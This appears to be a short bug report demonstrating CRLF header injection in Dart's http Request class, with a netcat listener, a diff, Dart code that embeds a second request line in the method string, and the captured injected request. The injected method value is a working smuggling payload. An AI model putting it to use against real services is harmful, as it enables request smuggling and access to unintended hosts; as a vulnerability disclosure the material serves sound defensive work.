

# dart http issue

## dummy server
please run dummy server using 1st terminal
```bash
sudo nc -l 127.0.0.1 80 
GET HTTP://EXAMPLE.COM/ HTTP/1.1
HOST: EXAMPLE.COM
LLAMA: /llama HTTP/1.1
user-agent: Dart/2.10 (dart:io)
accept-encoding: gzip
content-length: 0
host: localhost
```

## apply given diff
```diff
diff --git a/main.dart b/main.dart
index 8c78291..a46f4d0 100644
--- a/main.dart
+++ b/main.dart
@@ -4,7 +4,7 @@ import 'package:http/src/request.dart';
 void main() async {
   var r = Request(
       "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nLLAMA:",
-      Uri(scheme: "http", path: "/llama", host: "google.com"));
+      Uri(scheme: "http", path: "/llama", host: "localhost"));
   var rs = await r.send();
   var resp = await Response.fromStream(rs);
   print('${resp.body}');

```

## run dummy app
please execute `main.dart` using 2nd terminal
```bash
dart run main.dart
```

### Important piece of code
```dart
  var r = Request(
      "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nLLAMA:",
      Uri(scheme: "http", path: "/llama", host: "google.com"));
  var rs = await r.send();
```

## Critical path

Assumin `diff` showed above was not applied and used is behind `rev-proxy` Website served by `example.com` was reached.